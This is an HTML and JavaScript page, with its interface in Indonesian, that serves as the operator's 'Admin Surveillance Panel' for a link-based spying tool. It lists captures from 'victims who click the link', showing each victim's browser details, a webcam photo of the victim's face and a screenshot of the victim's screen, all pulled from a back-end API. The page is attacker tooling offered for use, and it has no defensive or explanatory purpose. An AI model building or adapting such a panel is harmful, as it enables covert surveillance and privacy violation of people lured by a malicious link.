<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Surveillance Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #111827; color: #d1d5db; }
        .capture-item:hover { background-color: #374151; }
        img { border: 2px solid #4b5563; }
    </style>
</head>
<body class="font-sans">

    <div class="container mx-auto p-4 md:p-8">
        <header class="mb-8 border-b border-gray-700 pb-4">
            <h1 class="text-3xl font-bold text-red-500">ADMIN SURVEILLANCE PANEL</h1>
            <p class="text-gray-400">Semua data korban yang mengklik link akan muncul di sini.</p>
        </header>

        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
            <!-- Kolom Daftar Korban -->
            <div class="md:col-span-1 bg-gray-800 p-4 rounded-lg shadow-lg">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="text-xl font-semibold">Daftar Tangkapan</h2>
                    <button id="refreshBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded transition">Refresh</button>
                </div>
                <div id="capture-list" class="space-y-2 max-h-[70vh] overflow-y-auto">
                    <!-- Daftar akan diisi oleh JavaScript -->
                    <p>Memuat data...</p>
                </div>
            </div>

            <!-- Kolom Detail -->
            <div id="detail-view" class="md:col-span-2 bg-gray-800 p-6 rounded-lg shadow-lg hidden">
                <h2 class="text-2xl font-bold mb-4 border-b border-gray-700 pb-2">Detail Tangkapan</h2>
                
                <div class="mb-4">
                    <p class="font-semibold">Waktu:</p>
                    <p id="detail-timestamp" class="text-lg font-mono bg-gray-900 p-2 rounded"></p>
                </div>
                <div class="mb-6">
                    <p class="font-semibold">User Agent (Info Browser & OS):</p>
                    <p id="detail-useragent" class="text-sm font-mono bg-gray-900 p-2 rounded"></p>
                </div>

                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div>
                        <h3 class="font-semibold mb-2 text-xl">Wajah Korban</h3>
                        <div id="detail-camera" class="bg-gray-900 p-2 rounded">
                            <!-- Gambar dari kamera akan ditampilkan di sini -->
                        </div>
                    </div>
                    <div>
                        <h3 class="font-semibold mb-2 text-xl">Tampilan Layar Korban</h3>
                        <div id="detail-screen" class="bg-gray-900 p-2 rounded">
                            <!-- Gambar dari layar akan ditampilkan di sini -->
                        </div>
                    </div>
                </div>
            </div>
             <div id="initial-view" class="md:col-span-2 flex items-center justify-center bg-gray-800 p-6 rounded-lg shadow-lg">
                <p class="text-gray-400 text-xl">Pilih data dari daftar di sebelah kiri untuk melihat detail.</p>
            </div>
        </div>
    </div>

    <script>
        const captureList = document.getElementById('capture-list');
        const detailView = document.getElementById('detail-view');
        const initialView = document.getElementById('initial-view');
        const refreshBtn = document.getElementById('refreshBtn');

        async function fetchCaptures() {
            try {
                const response = await fetch('/api/data'); 
                if (!response.ok) throw new Error(`Network response was not ok: ${response.statusText}`);
                const captures = await response.json();
                
                captureList.innerHTML = ''; 
                if (captures.length === 0) {
                    captureList.innerHTML = '<p class="text-gray-400">Belum ada data tertangkap.</p>';
                    return;
                }

                captures.forEach(capture => {
                    const item = document.createElement('div');
                    item.className = 'p-3 rounded cursor-pointer capture-item transition';
                    item.textContent = `Capture @ ${new Date(capture.created_at).toLocaleString()}`;
                    item.onclick = () => viewCaptureDetail(capture);
                    captureList.appendChild(item);
                });
            } catch (error) {
                captureList.innerHTML = `<p class="text-red-500">Error: ${error.message}</p>`;
                console.error('Failed to fetch captures:', error);
            }
        }

        async function viewCaptureDetail(data) {
            try {
                document.getElementById('detail-timestamp').textContent = data.timestamp;
                document.getElementById('detail-useragent').textContent = data.userAgent;
                
                const camContainer = document.getElementById('detail-camera');
                if (data.cameraImage && !data.cameraImage.startsWith("Error:")) {
                    camContainer.innerHTML = `<img src="${data.cameraImage}" alt="Camera Capture" class="w-full h-auto rounded">`;
                } else {
                    camContainer.innerHTML = `<p class="text-yellow-400">${data.cameraImage || 'Tidak ada data kamera.'}</p>`;
                }

                const screenContainer = document.getElementById('detail-screen');
                 if (data.screenImage && !data.screenImage.startsWith("Error:")) {
                    screenContainer.innerHTML = `<img src="${data.screenImage}" alt="Screen Capture" class="w-full h-auto rounded">`;
                } else {
                    screenContainer.innerHTML = `<p class="text-yellow-400">${data.screenImage || 'Tidak ada data layar.'}</p>`;
                }
                
                initialView.classList.add('hidden');
                detailView.classList.remove('hidden');

            } catch (error) {
                console.error('Failed to view capture detail:', error);
            }
        }
        
        refreshBtn.onclick = fetchCaptures;
        fetchCaptures();
    </script>
</body>
</html>
